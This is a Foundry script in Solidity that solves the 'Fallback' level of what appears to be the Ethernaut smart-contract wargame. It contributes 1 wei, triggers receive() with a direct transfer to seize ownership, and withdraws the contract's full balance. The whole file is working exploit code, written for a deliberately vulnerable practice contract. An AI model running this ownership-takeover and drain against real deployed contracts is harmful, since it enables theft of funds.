// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Fallback} from "../src/01_Fallback.sol";

contract FallbackSolve is Script {
	function run() public {
	// setup 
	address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");
	Fallback level01 = Fallback(payable(instanceAddress));
	
	vm.startBroadcast();
	// 1. stores a little bit of money through contribute()
	console2.log("Current owner: ", level01.owner());
	console2.log("Contributing 1 wei...");
	level01.contribute{value: 1 wei}();
		
	// 2. send 1 wei directly to the contract to trigger 
	console2.log("Trigerring receive()...");
	(bool success, ) = address(level01).call{value: 1 wei}("");
	require(success, "faliled to send ether :(");

	console2.log("new owner", level01.owner());
	require(msg.sender == level01.owner(), "Exploit Failed");

	// 3. Wrap up : withdraw everything
	console2.log("Withdrawing all balance");
	level01.withdraw();

	vm.stopBroadcast();
	console2.log("chall solved, Final balance of the contract: ", address(level01).balance);	
	}
}
